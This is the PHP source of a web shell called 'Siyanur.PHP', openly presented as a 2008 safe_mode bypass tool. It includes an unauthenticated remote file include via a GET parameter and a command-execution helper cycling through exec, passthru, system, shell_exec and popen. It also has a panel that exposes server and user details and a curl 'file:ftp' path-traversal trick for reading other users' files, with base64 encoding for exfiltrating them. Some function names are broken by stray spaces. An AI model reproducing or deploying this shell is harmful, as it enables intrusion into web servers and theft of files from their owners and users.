<?php/*
************************************************** **********************
* 0rYX_HACKER.PHP Handler Bypass Shell Beta 1.0 *
************************************************** **********************
* *
* / \ *
* \ \ ,, / / *
* '-.`\()/`.-' *
* .--_'( )'_--. * (C) 2008 NORTH-AFRICA * *
* / /` /`""`\ `\ \ *
* | | >< | | Public: 01, 2008 *
* \ \ / / Mailto: root-dz@hotmail.de *
* '.__.' *
* *
************************************************** **********************
*Greatz:// MecTruy // RedstorM // Kaldera // Exterminant // Dumenci //
*Linux version: 5.2.5 // 5.2.6 Bypassed
*Http:// www.north-africa.org // www.north-africa.com // north-africa.com
*Siyanur.php Shell
*/
#Siyanur.PHP 5.2.6 safe_mode Handler bypass Free Edition
#Sadece Bypass özelliði vardýr komut ve daha üstün özelliklere sahip Siyanur henüz daðýtýlmamýþtýr.
#
if ($_GET['x']) { include($_GET['x']); }
if ($_POST['cxc']=='down') {
header("Content-disposition: filename=decode.txt");
header("Content-type: application/octetstream");
header("Pragma: no-cache");
header("Expires: 0");
error_reporting(0);
echo base64_decode($_POST['xCod']);
exit;
}


?>
<html>


<head>
<title>Siyanur.PHP 5.2.6 safe_mode Handler bypass (Beta Free Edition) - Powered By MecTruy</title>
</head>


<body bgcolor="#000000">
<font color=FF8000>
<font face=verdana>
<?php


//
//phpinfo
if (empty($_POST['phpinfo'] )) {
}else{
echo $phpinfo=(!eregi("phpinfo",$dis_func)) ? phpinfo() : "phpinfo()";
exit;
}
//
// encode/decode
//
// uname
function getsystem()
{return php_uname('s')." ".php_uname('r')." ".php_uname('v');}; 
//
//safemode
function safe_mode(){
if(!$safe_mode && strpos(ex("echo abch0ld"),"h0ld")!=3){$_SESSION['safe_mode'] = 1;return "<b><font color=#800000 face=Verdana>ON</font></b>";}else{ $_SESSION['safe_mode'] = 0;return "<font color=#008000><b>OFF</b></font>";}
};function ex($in){
$out = '';
if(function_exists('exec')){exec($in,$out);$out = join("\n",$out);}elseif(function_exists('passthru')){ob_sta rt();passthru($in);$out = ob_get_contents();ob_end_clean();}
elseif(function_exists('system')){ob_start();syste m($in);$out = ob_get_contents();ob_end_clean();}
elseif(function_exists('shell_exec')){$out = shell_exec($in);}
elseif(is_resource($f = popen($in,"r"))){$out = "";while(!@feof($f)) { $out .= fread($f,1024);}
pclose($f);}
return $out;}
//
?>






<tr>
<td width="100%" height="43">


<table border="1" cellpadding="0" cellspacing="0" bordercolor="#545454" width="100%" id="AutoNumber2" bgcolor="#424242" style="border-collapse: collapse">
<tr>
<td width="100%" bgcolor="#000000">
</td>
</tr>
<tr>
<td width="100%" style="font-family: (1)Fonts44-Net; color: #FF0000; font-size: 8pt; font-weight: bold" dir="ltr"><font color=ffffff>Kernel :</font> <?php echo @php_uname();?></td>
</tr>
<tr>
<td width="100%" style="font-family: (1)Fonts44-Net; color: #FF0000; font-size: 8pt; font-weight: bold" dir="ltr"><font color=ffffff>Server :</font> <?php echo $_SERVER['SERVER_NAME'];?></td>
</tr>
<tr>
<td width="100%" style="font-family: (1)Fonts44-Net; color: #FF0000; font-size: 8pt; font-weight: bold" dir="ltr"><font color=ffffff>PHP :</font> <?php echo phpversion();?></td>
</tr>
<tr>
<td width="100%" style="font-family: (1)Fonts44-Net; color: #FF0000; font-size: 8pt; font-weight: bold" dir="ltr"><font color=ffffff>Dic :</font> <?php echo getcwd();?></td>
</tr>
<tr>
<td width="100%" style="font-family: (1)Fonts44-Net; color: #FF0000; font-size: 8pt; font-weight: bold" dir="ltr"><font color=ffffff>Safe_Mode :</font> <?php echo safe_mode();?></td>
</tr>
<tr>
<td width="100%" style="font-family: (1)Fonts44-Net; color: #FF0000; font-size: 8pt; font-weight: bold" dir="ltr"><font color=ffffff>Software :</font> <?php echo getenv("SERVER_SOFTWARE");?></td>
</tr>
<tr>
<td width="100%" style="font-family: (1)Fonts44-Net; color: #FF0000; font-size: 8pt; font-weight: bold" dir="ltr"><font color=ffffff>iD :</font> <?php echo system(id);?></td>
</tr>
<tr>
<td width="100%" style="font-family: (1)Fonts44-Net; color: #FF0000; font-size: 8pt; font-weight: bold" dir="ltr"><font color=ffffff>C0nnect ? :</font> <?php echo ($_SERVER['HTTP_CONNECTION']);?> <font color=ffffff>Port :</font> <?php echo (":".$_SERVER["SERVER_PORT"]);?> </td>
</tr>
<tr>
<td width="100%" style="font-family: (1)Fonts44-Net; color: #FF0000; font-size: 8pt; font-weight: bold" dir="ltr"><font color=ffffff>Your Agent :</font> <?php echo ($_SERVER['HTTP_USER_AGENT']);?> <font color=ffffff>Your ip info :</font> <?php echo ($_SERVER['REMOTE_ADDR']);?> MySQL: </td>
</tr>
<tr>
<td width="100%" style="font-family: (1)Fonts44-Net; color: #FF0000; font-size: 8pt; font-weight: bold" dir="ltr"><font color=ffffff>Protokol :</font> <?php echo ($_SERVER["SERVER_PROTOCOL"]);?> <font color=ffffff>Charset :</font> <?php echo ($_SERVER['HTTP_ACCEPT_CHARSET']);?> <font color=ffffff>Encoding :</font> <?php echo ($_SERVER['HTTP_ACCEPT_ENCODING']);?> <font color=ffffff>Lang :</font> <?php echo ($_SERVER['HTTP_ACCEPT_LANGUAGE']);?></td>
</tr>




<tr>


</tr>
</table>


</td>
</tr>


<tr>
<td width="100%" height="1"><?php
if (empty($_POST['z3r'])){

echo '<form method="POST">';
echo '<input type="text" name="z3r" size="50" value="/home/hedefuser/public_html/index.php">';
echo '<input type="submit" value="Encode">';
echo '</form>';
}else{
$b4se64 =$_POST['z3r'];
$heno =base64_encode($b4se64);
echo '<p align="center">';
echo '<textarea method="POST" rows="1" cols="80" wrar="off">';
print $heno;
echo '</textarea>';
}
echo '<form method="post" /><input type="text" name="cz" size="50" value="Encode edilmiþ kod buraya.." /><input type="submit" value="OK !!" /><select name=dec><option value=show>Oku</option><option value=decode>De$ifre</option></select></form>';


if( !empty($_POST['cz']) )
if ($dec=='decode'){echo "<form name=form method=POST>";}
echo "<p align=left><textarea method='POST' name='xCod' cols='60' rows='25' wrar='off' >";

$ss=$_POST['cz'];
$file = base64_decode($ss);


if((curl_exec(curl_init("file:ftp://../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../".$file))) aNd emptY($file))

if ($_POST['dec']=='decode'){echo base64_encode($_POST['xCod']);}




echo "</textarea></p>";


?></td>
</tr>
<tr>
<td width="100%" style="font-family: (1)Fonts44-Net; color: #FFFFFF; font-size: 8pt; font-weight: bold" height="13"><?php if ($dec=='decode'){ echo "<p align=center><input type=hidden name=cxc value='down'><input type=submit name=submit value='DownLoad'></p></form>"; } ?></td>
</tr>
<tr>
<td width="100%" style="font-family: (1)Fonts44-Net; color: #FFFFFF; font-size: 8pt; font-weight: bold" height="13">
<p align="left"><font size="1">orYX.PHP </font> <a href="sniper-dz">
<font size="1" color="#8B8B8B">sniper-dz</font></a> <a href="root-dz">
<font size="1" color="#8B8B8B">root-dz</font></a></td>
</tr>
<tr>
<td width="100%" style="font-family: (1)Fonts44-Net; color: #FFFFFF; font-size: 8pt; font-weight: bold" height="13">
<p align="left"> <font size="1">Coded By MecTruy</font></td>
</tr>
</table>


</center>
</div>


</body>


</html>
